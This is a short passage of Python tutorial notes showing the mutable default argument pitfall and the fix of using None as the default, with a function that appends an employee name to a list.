add_employee("John")
> ["Corey","John"]                       #returns both COrey and John instead of just John

#Right way
def add_employee(emp, emp_list=None):
	if emp_list is None:
		emp_list = []
	emp_list.append(emp)
	print(emp_list)

emps = ["John","Jane"]

add_employee("Corey")
add_employee("John")                    #returns only John

